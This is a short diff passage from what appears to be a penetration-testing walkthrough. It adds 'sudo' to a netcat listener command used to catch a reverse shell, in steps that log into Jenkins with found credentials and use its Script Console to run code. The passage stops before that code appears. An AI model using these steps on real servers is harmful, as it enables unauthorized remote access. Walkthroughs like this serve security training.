@@ -387,7 +387,7 @@ Log in to Jenkins with the found username and password.
 
 Start a listener:
 
-    nc -nlvp 5555
+    sudo nc -nlvp 5555
 
 In Jenkins, go to "Manage Jenkins > Nodes > master" and click on "Script Console". Enter (change the
 necessary parameters) this awesome code from 
